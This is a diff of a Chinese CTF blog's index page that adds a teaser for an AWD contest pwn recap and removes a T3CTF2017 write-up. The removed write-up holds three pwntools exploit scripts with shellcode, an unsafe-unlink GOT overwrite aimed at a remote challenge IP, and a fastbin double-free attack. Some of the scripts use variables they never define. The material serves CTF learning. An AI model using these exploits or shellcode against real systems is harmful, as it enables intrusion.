@@ -150,7 +150,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12px;">bin</a> <a href="/tags/code/" style="font-size: 14px;">code</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 16px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 14px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/writeup/" style="font-size: 16px;">writeup</a>
+                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12px;">bin</a> <a href="/tags/code/" style="font-size: 14px;">code</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 16px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 14px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/writeup/" style="font-size: 16px;">writeup</a> <a href="/tags/日语/" style="font-size: 10px;">日语</a>
                     </div>
                 </section>
                 
@@ -237,6 +237,78 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-2017-8-10" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/08/16/2017-8-10/" class="article-date">
+      <time datetime="2017-08-16T16:32:29.000Z" itemprop="datePublished">2017-08-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/16/2017-8-10/">810线下赛复盘</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>将atoi_got修改成printf_plt，威力无穷~</strong></p>
+<p>线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。</p>
+<ul>
+<li>string overflow</li>
+<li>int overflow</li>
+<li>off by one</li>
+<li>race condition</li>
+<li>heap overlay </li>
+<li>fmt</li>
+</ul>
+          
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/awd/">awd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a  href="/2017/08/16/2017-8-10/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-2017-8-9" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -825,70 +897,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-T3CTF2017" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/04/08/T3CTF2017/" class="article-date">
-      <time datetime="2017-04-08T07:26:51.000Z" itemprop="datePublished">2017-04-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/08/T3CTF2017/">【pwn】T3CTF2017 堆溢出以及return to  dl slove</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> pwn</div><div class="line"></div><div class="line">p = pwn.remote(<span class="string">"127.0.0.1"</span>,<span class="number">12346</span>)</div><div class="line">addr_bss = <span class="number">0x0804A080</span></div><div class="line">buf =  p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)+<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line">buf += (<span class="number">0x1f4</span>-len(buf))*<span class="string">'a'</span></div><div class="line">p.send(buf)</div><div class="line"></div><div class="line"></div><div class="line">buf = <span class="string">'a'</span>*<span class="number">504</span></div><div class="line">buf += p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)</div><div class="line">p.sendline(buf)</div><div class="line">data = p.recvuntil(<span class="string">"\n"</span>)</div><div class="line">p.sendline(<span class="string">"cat /lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>pwn2的libc可以从pwn1中获取。非常经典的double free教学题。可以参考 <a href="http://www.tuicool.com/articles/yquU732" target="_blank" rel="external">http://www.tuicool.com/articles/yquU732</a> （double free浅析，乌云的文章）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./pwn2'</span>)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x0400A6D\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">"120.27.248.138"</span>,<span class="number">12345</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"note index:\n"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">" of the new note:\n"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"ts of note:"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"ter the note index:"</span>)</div><div class="line">	sd(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">" note index:"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">" new note:"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"of note:\n"</span>)</div><div class="line">	sd(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"4"</span>)</div><div class="line">	ru(<span class="string">" note index:"</span>)</div><div class="line">	sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">	payload = <span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0x6020a8</span>)+p64(<span class="number">0</span>)+p64(addr)</div><div class="line">	edit(<span class="number">0</span>,len(payload),payload)</div><div class="line">	edit(<span class="number">2</span>,len(data),data)</div><div class="line"></div><div class="line">add(<span class="number">0</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">3</span>,<span class="number">512</span>,<span class="string">"/bin/sh\x00"</span>)</div><div class="line">head = p64(<span class="number">0</span>)+p64(<span class="number">1</span>+<span class="number">512</span>)</div><div class="line">fd = p64(<span class="number">0x6020C0</span> - <span class="number">0x18</span>)</div><div class="line">bk = p64(<span class="number">0x6020C0</span> - <span class="number">0x10</span>)</div><div class="line">payload =  head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">512</span>-len(payload))</div><div class="line">payload += p64(<span class="number">512</span>)+p64(<span class="number">512</span>+<span class="number">0x10</span>)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">600</span>-len(payload))</div><div class="line">edit(<span class="number">0</span>,<span class="number">600</span>,payload)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line"></div><div class="line">free_got = <span class="number">0x602018</span></div><div class="line">edit_anyaddr(<span class="number">0x6020C0</span>+<span class="number">0x20</span>,p64(puts_got))</div><div class="line">show(<span class="number">4</span>)</div><div class="line">free_addr = u64(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"free_addr="</span>+hex(free_addr)</div><div class="line"></div><div class="line">offset = <span class="number">0x83940</span><span class="number">-0x45390</span></div><div class="line">system_addr = puts_addr - offset</div><div class="line">edit_anyaddr(<span class="number">0x602018</span>,p64(system_addr))</div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;038a6d27a716d1e1472b1eded07c385d&#125;</span></div></pre></td></tr></table></figure>
-<p>pwn3是fastbin double free attack的考察点，要利用这个攻击我们需要伪造出一个fake fastbin出来,所幸题目给予了所有的攻击条件。</p>
-<p>可参考 <a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./pwn3'</span>)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x4009da\nc")</span></div><div class="line"><span class="comment"># else:</span></div><div class="line"><span class="comment"># 	p = remote()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"name\n"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">"ill enter:"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"our content:"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	sd(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">"ill enter:"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"our content:"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"index(0-9):"</span>)</div><div class="line">	sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setsize</span><span class="params">(size)</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">"number:"</span>)</div><div class="line">	sd(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line">	<span class="keyword">return</span> u64(ru(<span class="string">"\n"</span>)[<span class="number">0x30</span>:<span class="number">0x30</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf += <span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"</span></div><div class="line">buf += <span class="string">"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x56\x57\x48\x89\xe6\x0f\x05"</span></div><div class="line"></div><div class="line">shellcode = buf</div><div class="line">shellcode_addr = <span class="number">0x6020c0</span></div><div class="line"></div><div class="line">welcome(shellcode)</div><div class="line">setsize(<span class="number">0x30</span>)</div><div class="line">stack_addr = leak_stack()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line">offset = <span class="number">0x7ffcfca53d30</span> - <span class="number">0x00007ffcfca53c20</span> </div><div class="line">target_addr = stack_addr-offset<span class="number">-0x8</span></div><div class="line"><span class="keyword">print</span> <span class="string">"offset = "</span>+hex(offset)</div><div class="line"><span class="keyword">print</span> <span class="string">"target_addr = "</span>+hex(target_addr)</div><div class="line"></div><div class="line">add2(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">dele(<span class="number">0</span>)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line">dele(<span class="number">0</span>)<span class="comment">#a-b-a</span></div><div class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(shellcode_addr)</div><div class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,payload)</div><div class="line">sd(<span class="string">"4"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap-overflow/">heap overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
       
